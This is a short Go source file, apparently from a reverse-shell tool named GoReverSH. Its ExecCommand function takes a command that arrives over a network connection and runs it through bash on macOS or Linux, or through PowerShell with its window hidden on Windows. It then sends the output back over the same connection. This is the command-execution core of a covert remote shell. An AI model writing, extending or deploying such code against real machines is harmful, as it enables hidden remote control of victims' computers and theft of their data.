package pkgclient

import (
	"GoReverSH/utils"
	"encoding/json"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func ExecCommand(command string, conn net.Conn) error {
	var cmd *exec.Cmd
	//mac linux or windows
	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/bash", "-c", command)
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", command)
	}
	out, err := cmd.Output()
	if err != nil {
		log.Println(err)
		return err
	}

	output := utils.Output{Type: utils.MESSAGE, Message: out}
	err = json.NewEncoder(conn).Encode(output)
	if err != nil {
		log.Println(err)
		return err
	}
	return nil
}
